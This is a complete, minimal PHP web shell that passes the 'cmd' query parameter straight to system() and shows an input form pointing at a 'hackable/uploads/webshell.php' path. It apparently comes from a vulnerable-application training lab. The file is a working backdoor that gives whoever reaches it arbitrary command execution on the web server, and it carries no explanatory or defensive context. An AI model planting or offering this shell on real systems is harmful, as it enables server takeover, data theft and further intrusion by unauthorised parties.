<?
system($_GET['cmd']);
echo '<p>Type a command: <form method="GET" action="../../hackable/uploads/webshell.php"><input type="text" name="cmd"/></form></p>';
?>